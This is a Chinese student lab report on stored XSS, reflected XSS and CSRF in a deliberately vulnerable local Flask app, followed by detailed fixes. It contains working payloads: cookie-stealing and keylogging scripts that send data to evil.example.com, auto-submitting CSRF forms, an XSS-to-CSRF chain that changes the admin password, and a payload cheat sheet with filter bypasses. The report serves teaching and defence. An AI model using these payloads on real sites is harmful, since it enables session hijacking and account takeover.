# 大二实训Day7：XSS与CSRF漏洞实验报告

**姓名**：敬君琳 &nbsp;&nbsp;&nbsp;&nbsp; **学院**：网络空间安全学院  
**专业**：网络空间安全 &nbsp;&nbsp;&nbsp;&nbsp; **学号**：2024141530063  
**实验日期**：2026年7月24日 &nbsp;&nbsp;&nbsp;&nbsp; **指导老师**：陈腾  
**实验名称**：XSS跨站脚本攻击与CSRF跨站请求伪造漏洞分析与利用  

---

## 一、实验目的

1. 了解XSS（跨站脚本攻击）的基本概念、分类（反射型XSS、存储型XSS、DOM型XSS）及危害。
2. 掌握CSRF（跨站请求伪造）的攻击原理和利用方式。
3. 通过在留言板中插入恶意脚本，理解存储型XSS的攻击流程。
4. 通过在反馈功能中构造恶意URL参数，理解反射型XSS的攻击流程。
5. 通过构造恶意页面诱导用户点击，实现对密码修改功能的CSRF攻击。
6. 学习XSS和CSRF漏洞的修复方案，包括输出编码、CSRF Token、SameSite Cookie等防护措施。

---

## 二、实验环境

- 操作系统：Windows 11 Pro
- 开发语言：Python 3.x + Flask框架
- 数据库：SQLite 3
- 开发工具：Visual Studio Code
- 测试工具：Burp Suite Community / Chrome DevTools
- 浏览器：Google Chrome
- 端口：5000（Flask本地服务）

---

## 三、Day7 新增功能

### 3.1 功能概览

| 功能 | 路由 | 方法 | 说明 |
|------|------|------|------|
| 修改密码 | `/change-password` | POST | 使用用户名和新密码修改密码（存在CSRF漏洞） |
| 留言板 | `/post-comment` | POST | 用户发表留言并展示所有留言（存在存储型XSS漏洞） |
| 意见反馈 | `/feedback` | GET/POST | 用户提交反馈并回显内容（存在反射型XSS漏洞） |

### 3.2 数据库扩展

在原有 users 表基础上新增了 comments 表：

**comments 表结构**：

| 字段 | 类型 | 约束 |
|------|------|------|
| id | INTEGER | PRIMARY KEY AUTOINCREMENT |
| username | TEXT | NOT NULL |
| content | TEXT | NOT NULL |
| created_at | TEXT | NOT NULL |

### 3.3 项目文件结构

```
Day7/
├── app.py                     # Flask 主程序（含XSS和CSRF漏洞）
├── data/
│   └── users.db               # SQLite 数据库（自动生成）
├── pages/
│   └── help.html              # 帮助中心页面
├── templates/
│   ├── base.html              # 基础模板（导航栏新增反馈入口）
│   ├── index.html             # 首页（新增留言板和反馈回显区域）
│   ├── login.html             # 登录页
│   ├── register.html          # 注册页
│   ├── upload.html            # 文件上传页
│   └── profile.html           # 个人中心（新增修改密码表单）
└── static/
    └── css/
        └── style.css          # 样式文件（新增留言板、反馈样式）
```

---

## 四、漏洞一：存储型XSS（Stored XSS）

### 4.1 漏洞原理

存储型XSS是指攻击者将恶意脚本提交到Web应用程序的数据库中，当其他用户访问包含该数据的页面时，恶意脚本从数据库中取出并在用户浏览器中执行。这种攻击方式影响范围最广，所有访问该页面的用户都可能成为受害者。

### 4.2 漏洞代码分析

**留言板提交接口（app.py 第259行）**：

```python
@app.route("/post-comment", methods=["POST"])
def post_comment():
    username = session.get("username")
    if not username:
        return redirect("/login")

    content = request.form.get("content", "")
    # 直接将用户输入的 content 原样存入数据库，不做任何过滤
    if content:
        cursor.execute(
            "INSERT INTO comments (username, content, created_at) VALUES (?, ?, ?)",
            (username, content, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
    return redirect("/")
```

**留言显示模板（templates/index.html）**：

```html
<!-- 漏洞关键：使用 | safe 过滤器，Flask不会对输出做HTML转义 -->
<div class="comment-content">{{ comment.content | safe }}</div>
```

**漏洞分析**：

留言内容和显示这两个环节分别存在不同的问题。存入时没有对用户输入做任何过滤，取出时使用Jinja2的 `| safe` 过滤器让内容原样输出。Jinja2模板引擎默认会对 `{{ }}` 中的内容进行HTML实体编码（例如 `<` 会变成 `&lt;`），但 `| safe` 标记告诉Flask"这个内容是安全的，不需要编码"，于是 `<script>` 标签就会直接被浏览器解析执行。

因此，攻击者在留言板提交的HTML/JavaScript代码会被浏览器当作页面的合法部分来执行。

### 4.3 攻击演示

**攻击场景一：弹窗测试**

以用户alice登录后，在留言板输入框中提交：

```html
<script>alert('XSS攻击测试')</script>
```

点击"发表"后，留言被存储到数据库中。任何用户在访问首页时，浏览器都会解析并执行这段脚本，弹出一个警告框。

**攻击场景二：Cookie窃取**

攻击者在留言板中提交：

```html
<script>
var img = new Image();
img.src = 'http://evil.example.com/steal?cookie=' + document.cookie;
</script>
```

当其他用户（包括管理员admin）访问首页时，脚本会自动将当前用户的Cookie发送到攻击者的服务器。攻击者拿到Cookie后可以伪造用户身份登录系统。

**攻击场景三：页面重定向**

```html
<script>window.location.href='http://evil.example.com/phishing'</script>
```

用户访问首页后自动跳转到钓鱼网站，攻击者可以仿造登录页面诱导用户输入凭证。

**攻击场景四：页面篡改**

```html
<script>
document.body.innerHTML = '<h1>此网站已被黑</h1>';
</script>
```

访问后整个页面内容被替换，系统无法正常使用，影响所有用户的体验。

### 4.4 攻击影响分析

存储型XSS攻击一旦成功，可以实现以下危害：

1. 窃取其他用户的Cookie或Session信息，冒充其他用户身份（包括管理员）
2. 篡改页面内容，发布虚假信息或钓鱼表单
3. 记录用户的键盘输入（键盘记录器）
4. 利用受害者的浏览器对系统发起CSRF攻击
5. 将用户重定向到恶意网站
6. 在受害者浏览器中运行挖矿脚本

由于留言内容是持久化存储的，每一次页面刷新或任何用户访问首页，恶意脚本都会重新执行一次，所以危害范围极大、持续时间很长。

---

## 五、漏洞二：反射型XSS（Reflected XSS）

### 5.1 漏洞原理

反射型XSS是指恶意脚本通过URL参数或表单提交，被服务器直接"反射"回响应页面中，浏览器解析页面时执行该脚本。这种攻击通常需要攻击者诱导用户点击特制的链接，属于一次性的攻击。

### 5.2 漏洞代码分析

**反馈接口（app.py 第274行）**：

```python
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    if request.method == "POST":
        feedback_msg = request.form.get("message", "")
        # 直接将用户输入回显给模板，不做任何过滤或转义
        echo_content = feedback_msg

    # GET方式也支持回显（/feedback?q=xxx）
    search_query = request.args.get("q", "")

    return render_template(
        "index.html",
        user=user_info,
        feedback_msg=feedback_msg,
        echo_content=echo_content,
        search_query=search_query
    )
```

**模板回显（templates/index.html）**：

```html
<!-- 漏洞：使用 | safe 过滤器，不对用户输入做HTML转义 -->
<div class="comment-content">{{ echo_content | safe }}</div>
<div class="comment-content">{{ search_query | safe }}</div>
```

**漏洞分析**：用户提交的反馈内容或URL参数被直接回显到页面中，且使用了 `| safe` 标记。Jinja2默认会对 `{{ }}` 输出进行HTML实体编码（`<` 会变成 `&lt;`），从而阻止脚本执行。但在代码中刻意使用了 `| safe` 过滤器跳过了这个保护机制。攻击者可以构造一个带有恶意脚本的URL，将这个链接发送给受害者。当受害者点击链接时，恶意脚本在其浏览器中执行。

### 5.3 攻击演示

**攻击场景一：GET方式回显弹窗**

构造恶意URL并诱导受害者点击：

```
http://127.0.0.1:5000/feedback?q=<script>alert('反射型XSS')</script>
```

受害者点击此链接后，`<script>alert('反射型XSS')</script>` 被服务器回显到页面中且未被转义，浏览器解析页面时执行了弹窗。

**攻击场景二：Cookie窃取链接**

```
http://127.0.0.1:5000/feedback?q=<script>new Image().src='http://evil.example.com/steal?c='+document.cookie</script>
```

诱导受害者点击或在其他网站的iframe中加载此URL，受害者的Cookie会被发送到攻击者服务器。

**攻击场景三：POST方式反射**

攻击者构造一个恶意网页，其中包含一个自动提交的表单：

```html
<html>
<body onload="document.forms[0].submit()">
    <form action="http://127.0.0.1:5000/feedback" method="POST">
        <input name="message" value="<script>alert(document.cookie)</script>">
    </form>
</body>
</html>
```

受害者访问这个恶意页面后，表单自动提交，脚本在受害者浏览器中反射执行。

### 5.4 反射型XSS与存储型XSS对比

| 对比项 | 存储型XSS | 反射型XSS |
|--------|----------|----------|
| 恶意脚本存储位置 | 存储在服务器数据库中 | 在URL参数或表单中 |
| 触发方式 | 任何人访问页面即触发 | 需要诱导用户点击特制链接 |
| 持久性 | 持久存在，直到数据被删除 | 一次性，仅单次请求有效 |
| 攻击范围 | 所有访问该页面的用户 | 只有点击了恶意链接的用户 |
| 攻击难度 | 高（需要找到输入点和输出点） | 中（需要社会工程学配合） |
| 典型场景 | 留言板、评论区、用户资料页 | 搜索框、错误提示、反馈页 |

---

## 六、漏洞三：CSRF（Cross-Site Request Forgery）

### 6.1 漏洞原理

CSRF（跨站请求伪造）是指攻击者诱导用户访问一个恶意页面，该页面在用户不知情的情况下，以用户的身份向目标网站发送请求。由于浏览器会自动携带目标网站的Cookie，服务端会认为这是一个合法的用户操作。

### 6.2 密码修改接口分析

**修改密码路由（app.py 第273行）**：

```python
@app.route("/change-password", methods=["POST"])
def change_password():
    # 只检查是否登录，不检查其他任何内容
    username = session.get("username")
    if not username:
        return redirect("/login")

    target_username = request.form.get("username", "")
    new_password = request.form.get("new_password", "")

    # 直接更新密码，不验证原密码
    # 不校验当前登录用户是否有权限修改目标用户的密码
    hashed_pw = generate_password_hash(new_password)

    # 更新内存中的 USERS 字典
    if target_username in USERS:
        USERS[target_username]["password"] = hashed_pw

    # 更新数据库中的密码
    cursor.execute(
        "UPDATE users SET password = ? WHERE username = ?",
        (hashed_pw, target_username)
    )

    return redirect("/profile")
```

**漏洞特征（全部命中）**：

1. 未使用 CSRF Token 验证请求来源
2. 不需要验证原密码即可修改
3. 不校验 session 中的用户和表单提交的 username 是否一致（任意用户可改任意人密码）
4. 不检查 Referer/Origin 请求头
5. 修改成功后没有安全提示，直接重定向

### 6.3 攻击演示

**攻击场景一：CSRF修改admin密码**

攻击者在自己的网站上放置以下恶意页面（csrf_attack.html）：

```html
<html>
<body>
    <h2>恭喜你中奖了！点击领取奖品</h2>
    <!-- 隐藏的自动提交表单 —— 受害者完全看不到 -->
    <form id="csrf-form" action="http://127.0.0.1:5000/change-password" method="POST">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="new_password" value="hacked123">
    </form>
    <script>
        // 页面加载后自动提交表单
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

攻击流程分以下几步：

1. 攻击者准备好这个页面，可以选择放在自己可控的网站上，也可以作为本地HTML文件发送给受害者。
2. 此时受害者alice已经登录了用户管理系统（例如访问 http://127.0.0.1:5000 并正常登录），但还没有退出，浏览器里存着有效的Session Cookie。
3. 攻击者通过邮件、聊天消息或论坛帖子等方式，将恶意页面的链接发给alice，并用各种话术诱导alice打开这个链接。
4. alice出于好奇或信任点开了这个链接。
5. 恶意页面在alice完全没有察觉的情况下自动向 `/change-password` 发送了POST请求。由于是同一个浏览器发起的请求，浏览器会自动将管理系统的Cookie也一并发送过去。
6. 服务器检查发现Cookie对应的Session有效（因为alice确实是登录状态），于是通过了登录校验，然后根据表单中的参数把admin的密码改成了"hacked123"。
7. 攻击者现在可以用 admin / hacked123 登录系统，获得管理员权限。

**关键点**：整个过程alice不知情，浏览器自动发送了Cookie（这也是浏览器"同源策略不限制Cookie发送方向"这一特性的直接体现——浏览器在发起跨域请求时仍然会携带目标域名的Cookie），服务器因为只检查了登录态就放行，所以攻击成功。

**攻击场景二：修改自己的密码（自我攻击型）**

如果攻击者诱使已登录用户访问一个恶意页面，把表单中的username设为受害者自己的用户名，则受害者在不知情的情况下修改了自己的密码，导致无法登录。

**攻击场景三：批量修改密码**

攻击者可以尝试遍历用户名，在一个恶意页面中包含多个隐藏的iframe或表单：

```html
<iframe style="display:none" src="http://127.0.0.1:5000/profile?user_id=1"></iframe>
<!-- 先获取其他用户信息，再遍历修改密码 -->
```

### 6.4 CSRF攻击成功的必要条件

1. 受害者已经登录目标网站，Cookie仍然有效
2. 目标网站的敏感操作（如修改密码）没有CSRF防护
3. 攻击者能够构造一个自动发送请求的页面
4. 受害者被诱导访问了该恶意页面

---

## 七、综合攻击：XSS + CSRF 组合利用

### 7.1 组合攻击原理

存储型XSS和CSRF可以组合利用，产生更严重的攻击效果。攻击者先通过XSS注入恶意脚本，该脚本利用用户在目标网站的登录状态发起CSRF攻击。这种组合攻击可以在不依赖外部恶意页面的情况下完成，攻击链更隐蔽。

### 7.2 攻击演示

攻击者在留言板中提交以下留言内容：

```html
<script>
// 该脚本在受害者浏览器中自动执行
// 1. 首先获取当前用户的身份信息
var currentUser = document.querySelector('.nav-welcome');
console.log('当前用户: ' + currentUser.textContent);

// 2. 自动提交修改密码的CSRF请求
var xhr = new XMLHttpRequest();
xhr.open('POST', '/change-password', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('username=admin&new_password=pwned_by_xss');

// 3. 也可以窃取Cookie并发送到外部服务器
var img = new Image();
img.src = 'http://evil.example.com/log?data=' + encodeURI(document.cookie);
</script>
```

这段代码的执行过程是：

1. 任何一个已登录用户访问首页，留言板的内容被加载出来。
2. `| safe` 过滤器让浏览器把 `<script>` 标签当作JavaScript代码来执行。
3. 脚本自动发送POST请求到 `/change-password`，修改admin的密码。
4. 由于当前用户已登录且Cookie有效，服务器接受了这个请求。
5. admin的密码在真正的管理员毫不知情的情况下被改为攻击者设定的值。

这种攻击的威力在于：只要有一个用户打开首页，攻击就会自动发生。如果管理员admin自己打开首页看到了这条留言，那么admin自己的密码就被改了——攻击者不需要知道管理员什么时候在线，只要管理员或任何已登录用户某一天打开首页，攻击就会触发。

这就是为什么说XSS+CSRF组合是Web安全中危害极大的攻击链：XSS负责在目标域内执行任意JavaScript（绕过了同源策略对JavaScript主动发起的跨域读取请求的限制），CSRF负责利用这一能力向同源接口发送恶意请求，两者配合可以完成几乎所有攻击者想做的事情。

---

## 八、漏洞修复方案

### 8.1 XSS漏洞修复

#### 8.1.1 输出编码（HTML Entity Encoding）

**原理**：对输出到HTML页面的用户数据进行HTML实体编码，将特殊字符转换为对应的HTML实体。

| 字符 | HTML实体 |
|------|---------|
| < | &amp;lt; |
| > | &amp;gt; |
| & | &amp;amp; |
| " | &amp;quot; |
| ' | &amp;#x27; |

**修复方法**：移除模板中的 `| safe` 过滤器，让Jinja2默认进行HTML转义：

```html
<!-- 修复前（不安全） -->
<div class="comment-content">{{ comment.content | safe }}</div>

<!-- 修复后（安全 — 默认转义） -->
<div class="comment-content">{{ comment.content }}</div>
```

#### 8.1.2 输入过滤

除了输出编码，还应该在服务端对用户输入进行白名单过滤。如果业务场景允许纯文本，可以彻底移除所有HTML标签：

```python
import re

def sanitize_input(text):
    """移除所有HTML标签"""
    # 去掉 <script>、<img>、<a> 等所有HTML标签
    clean = re.sub(r'<[^>]*>', '', text)
    return clean

# 在存储前调用
content = sanitize_input(request.form.get("content", ""))
```

此外，还可以使用成熟的XSS过滤库如 Bleach（Python）来完成更完善的过滤。

#### 8.1.3 Content-Security-Policy（CSP）

**原理**：通过HTTP响应头告诉浏览器哪些源的内容是可信的、允许加载的。浏览器会阻止不符合策略的脚本执行。

```python
# 在Flask中添加CSP响应头
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = \
        "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'"
    return response
```

**CSP各指令含义**：

| 指令 | 含义 | 示例值 |
|------|------|--------|
| default-src | 默认加载策略 | 'self'（仅允许同源） |
| script-src | JavaScript加载策略 | 'self'（禁止内联脚本和外部脚本） |
| style-src | CSS样式加载策略 | 'self' |
| img-src | 图片加载策略 | 'self' |
| connect-src | AJAX/WebSocket连接策略 | 'self' |

注意：'self' 只能限制从哪个域名加载资源，但不能阻止反射型和存储型XSS中直接写入 `<script>` 标签的内联代码。要阻止内联脚本，还需要配合 nonce或hash机制，或者直接使用 `script-src 'nonce-<随机值>'`。

#### 8.1.4 HttpOnly Cookie

给Session Cookie设置HttpOnly属性，使JavaScript无法通过 `document.cookie` 读取Cookie：

```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
```

这样一来，即使存在XSS漏洞，攻击者也无法直接通过 `document.cookie` 窃取Session ID。但需要注意的是，HttpOnly只能防止Cookie被读取，不能阻止攻击者利用XSS发起CSRF请求（因为浏览器发送请求时会自动携带Cookie，不受HttpOnly影响）。

### 8.2 CSRF漏洞修复

#### 8.2.1 CSRF Token（推荐方案）

**原理**：服务器为每个用户Session生成一个随机的CSRF Token，嵌入表单的隐藏字段中。处理请求时验证表单中的Token是否与Session中的Token一致。攻击者无法事先知道这个随机值，所以无法构造有效的伪造请求。

**实现步骤**：

```python
# 1. 在 session 中存储 CSRF Token
import secrets

@app.before_request
def csrf_protect():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)

# 2. 在表单中添加隐藏字段
# <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">

# 3. 在敏感操作（如修改密码）中验证Token
@app.route("/change-password", methods=["POST"])
def change_password():
    # 验证 CSRF Token
    token = request.form.get("csrf_token", "")
    if not token or token != session.get("csrf_token"):
        return "CSRF验证失败，请求被拒绝", 403
    # ... 继续处理密码修改
```

Token需要满足以下要求：每个会话独立、足够长且随机（至少128位）、不可预测。攻击者无法从外部获取Token值，因此无法构造有效的请求。

#### 8.2.2 验证原密码

修改密码等敏感操作必须要求用户输入原密码，即使CSRF攻击成功提交了请求，攻击者不知道原密码也无法完成修改：

```python
# 先验证原密码
old_password = request.form.get("old_password", "")
user = USERS.get(username)
if not user or not check_password_hash(user["password"], old_password):
    return "原密码错误，修改失败", 403
```

#### 8.2.3 验证Referer/Origin请求头

检查HTTP请求中的Referer或Origin头，确认请求来自本站页面。这种方法不是100%可靠（Referer可以被伪造或禁用），但可以作为辅助防护。

```python
@app.route("/change-password", methods=["POST"])
def change_password():
    # 校验 Referer
    referer = request.headers.get("Referer", "")
    if "127.0.0.1:5000" not in referer and "localhost" not in referer:
        return "非法请求来源", 403
    # ... 继续处理
```

#### 8.2.4 SameSite Cookie属性

设置Cookie的SameSite属性为Strict或Lax，限制跨站请求时Cookie的发送行为：

```python
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
```

| SameSite值 | 行为 |
|-----------|------|
| Strict | 完全禁止跨站发送Cookie（最严格，但可能影响用户体验） |
| Lax | 允许顶级导航（如点击链接）时发送Cookie，禁止POST等跨站请求携带Cookie（推荐） |
| None | 不限制（需配合Secure属性使用） |

SameSite=Lax 是目前大多数浏览器的默认值，它的权衡比较合理：一方面阻止了跨站POST/iframe等场景下的CSRF攻击，另一方面允许用户从外部页面点击链接进来时仍然保持登录状态，不会影响正常的页面跳转体验。

### 8.3 修复代码对比

#### 8.3.1 存储型XSS修复

```python
# ===== 修复前 =====
@app.route("/post-comment", methods=["POST"])
def post_comment():
    content = request.form.get("content", "")
    # 直接存入数据库，不做过滤
    cursor.execute("INSERT INTO comments ...", (username, content, ...))

# 模板中
{{ comment.content | safe }}


# ===== 修复后 =====
@app.route("/post-comment", methods=["POST"])
def post_comment():
    content = request.form.get("content", "")
    # 使用BLEACH库清洗HTML标签
    import bleach
    allowed_tags = ['b', 'i', 'u', 'br', 'p']
    content = bleach.clean(content, tags=allowed_tags, strip=True)
    cursor.execute("INSERT INTO comments ...", (username, content, ...))

# 模板中（移除 | safe 过滤器）
{{ comment.content }}
```

#### 8.3.2 反射型XSS修复

```python
# ===== 修复前 =====
echo_content = feedback_msg  # 原样回显
# 模板中
{{ echo_content | safe }}


# ===== 修复后 =====
# 不需要额外处理，模板默认转义
echo_content = feedback_msg  # Jinja2 自动HTML编码
# 模板中（移除 | safe 过滤器）
{{ echo_content }}
```

#### 8.3.3 CSRF修复

```python
# ===== 修复前 =====
@app.route("/change-password", methods=["POST"])
def change_password():
    # 仅检查登录态
    if not session.get("username"):
        return redirect("/login")
    target = request.form.get("username")
    new_pw = request.form.get("new_password")
    # 直接修改，无任何防护
    USERS[target]["password"] = generate_password_hash(new_pw)


# ===== 修复后 =====
@app.route("/change-password", methods=["POST"])
def change_password():
    current_user = session.get("username")
    if not current_user:
        return redirect("/login")

    # 1. CSRF Token校验
    token = request.form.get("csrf_token", "")
    if not token or token != session.get("csrf_token"):
        return "CSRF Token验证失败", 403

    # 2. 原密码验证
    old_pw = request.form.get("old_password", "")
    user = USERS.get(current_user)
    if not user or not check_password_hash(user["password"], old_pw):
        return "原密码错误", 403

    # 3. 只允许修改自己的密码
    new_pw = request.form.get("new_password", "")
    USERS[current_user]["password"] = generate_password_hash(new_pw)
```

### 8.4 防护措施汇总

| 防护措施 | 防护目标 | 防护原理 | 优先级 |
|----------|---------|---------|:------:|
| HTML输出编码 | XSS | 将 `<` `>` 等转为 HTML 实体，阻止浏览器解析为标签 | 高 |
| CSRF Token | CSRF | 验证表单Token与Session Token一致，攻击者无法预测 | 高 |
| 输入过滤 | XSS | 移除用户输入中的HTML标签和危险字符 | 高 |
| CSP响应头 | XSS | 浏览器层面的脚本执行管控，限制脚本来源 | 中 |
| HttpOnly Cookie | XSS | 禁止JS读取Cookie，降低Cookie被窃取的风险 | 中 |
| 验证原密码 | CSRF | 敏感操作需要确认身份凭据 | 中 |
| SameSite Cookie | CSRF | 浏览器层面限制跨站请求发送Cookie | 中 |
| Referer校验 | CSRF | 验证请求来源是否为本站 | 低（辅助） |

---

## 九、实验总结

通过本次实验，我对XSS和CSRF这两种Web安全漏洞有了从理论到实践的完整认识：

1. **XSS攻击的危害比表面看起来大得多** —— 一开始我觉得"弹个窗而已有什么大不了"，但实际操作后发现XSS能做的事情远不止弹窗。它能窃取Cookie、劫持会话、篡改页面内容，甚至配合CSRF完成更复杂的攻击链。留言板的存储型XSS更危险，因为恶意的脚本会被持久存储，每一个打开页面的用户都会中招。

2. **CSRF是一种"借刀杀人"的攻击方式** —— 攻击者不需要直接入侵服务器，也无需获取用户的密码，只需要诱导用户点击一个链接，就能以用户的身份执行敏感操作。修改密码的实验让我深刻认识到：如果只有登录态的检查而没有CSRF Token，任何"看起来是本人操作"的请求都可能是伪造的。

3. **`| safe` 过滤器是一把双刃剑** —— 在Jinja2模板中，为了提高灵活性允许信任的内容不做转义，但如果这个"信任"被滥用，把用户输入也标记为safe，就等于给了攻击者直接在页面中执行任意代码的权限。默认的HTML转义是安全的第一道屏障，移除它之前一定要确认数据来源可信。

4. **XSS和CSRF经常组合出现** —— XSS可以在目标域名下执行JavaScript，绕过了浏览器的同源策略对JavaScript的限制。有了这个能力，攻击者就可以直接对同源的接口发起CSRF攻击。而且因为JavaScript是在目标域名上下文中执行的，它可以先读取页面内容获取CSRF Token（如果页面上有的话），然后再发送"合法"的请求——这种情况下仅靠CSRF Token是不够的，必须从源头解决XSS。

5. **防御是分层的，不能只靠一种手段** —— 输出编码解决XSS的脚本执行问题，CSRF Token解决请求伪造问题，HttpOnly降低Cookie被盗的损失，CSP从浏览器层面兜底。每一层防护各司其职，多层叠加才能构成完整的防御体系。单一防护措施的失效不应该导致整个系统沦陷。

6. **安全意识要贯穿开发和测试的每个环节** —— 在写代码的时候就要思考：用户输入的数据最终会显示在哪里？有没有 `| safe`？修改密码的接口有没有验证Token？这些问题不应该等到安全测试的时候才去想，而应该成为写每一行代码时的习惯。

---

## 十、项目文件清单

```
Day7/
├── app.py                              # Flask 主程序（含XSS/CSRF漏洞 + 密码修改功能）
├── data/
│   └── .gitkeep                        # 数据库目录占位文件
├── pages/
│   └── help.html                       # 帮助中心页面
├── templates/
│   ├── base.html                       # 基础模板（导航栏新增反馈入口）
│   ├── index.html                      # 首页（新增留言板、反馈回显、搜索回显）
│   ├── login.html                      # 登录页
│   ├── register.html                   # 注册页
│   ├── upload.html                     # 文件上传页
│   └── profile.html                    # 个人中心（新增修改密码表单，含CSRF漏洞）
├── static/
│   └── css/
│       └── style.css                   # 样式文件（新增留言板、反馈样式）
├── Day7-XSS与CSRF漏洞实验报告-敬君琳.md   # 实验报告（Markdown版本）
└── Day7-XSS与CSRF漏洞实验报告-敬君琳.docx  # 实验报告（Word版本）
```

### 启动方式

```bash
cd Day7
python app.py
```

访问 http://localhost:5000 ，预设登录账号 `admin / admin123` 和 `alice / alice2025`。

---

## 附录A：XSS攻击Payload速查

```html
<!-- 基础弹窗测试 -->
<script>alert('XSS')</script>

<!-- IMG标签事件 -->
<img src=x onerror=alert('XSS')>

<!-- onload事件 -->
<body onload=alert('XSS')>

<!-- SVG事件 -->
<svg onload=alert('XSS')>

<!-- Cookie窃取 -->
<script>new Image().src='http://evil.example.com/steal?c='+document.cookie</script>

<!-- 页面重定向 -->
<script>window.location='http://evil.example.com'</script>

<!-- 页面篡改 -->
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>

<!-- 键盘记录器 -->
<script>
document.onkeypress=function(e){
    new Image().src='http://evil.example.com/keys?k='+e.key;
}
</script>

<!-- 绕过简单过滤：大小写混用 -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- 绕过简单过滤：嵌套 -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

## 附录B：CSRF攻击测试命令

```bash
# 使用curl模拟CSRF攻击（需替换为实际的Cookie值）
# 1. 获取登录后的Cookie
curl -c cookies.txt -X POST "http://127.0.0.1:5000/login" \
  -d "username=alice&password=alice2025"

# 2. 使用获取的Cookie修改admin的密码
curl -b cookies.txt -X POST "http://127.0.0.1:5000/change-password" \
  -d "username=admin&new_password=hacked123"

# 3. 验证：使用新密码登录admin
curl -c cookies2.txt -X POST "http://127.0.0.1:5000/login" \
  -d "username=admin&password=hacked123"
# 如果登录成功，说明CSRF攻击成功
```
